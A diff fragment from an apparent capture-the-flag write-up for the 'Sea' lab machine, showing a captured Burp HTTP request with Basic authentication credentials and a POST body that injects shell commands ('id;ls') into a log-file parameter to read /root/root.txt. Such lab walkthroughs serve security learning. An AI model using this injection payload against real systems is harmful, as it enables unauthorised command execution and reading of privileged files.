@@ -543,3 +543,26 @@ HTTP request sent, awaiting response... 401 Unauthorized
 
 Username/Password Authentication Failed.
 ```
+burp output:
+```bash
+POST / HTTP/1.1
+Host: sea.htb:4444
+Content-Length: 57
+Cache-Control: max-age=0
+Authorization: Basic YW1heTpteWNoZW1pY2Fscm9tYW5jZQ==
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36
+Origin: http://sea.htb:4444
+Content-Type: application/x-www-form-urlencoded
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://sea.htb:4444/
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US,en;q=0.9
+Cookie: PHPSESSID=t2e7cgclob431b1tfj7oedpc47
+Connection: close
+
+log_file=/root/root.txt;id;ls&analyze_log=
+```
+
+root.txt:
+![image](https://github.com/user-attachments/assets/76c09091-53fb-45e6-9c7b-4b225f5510c5)
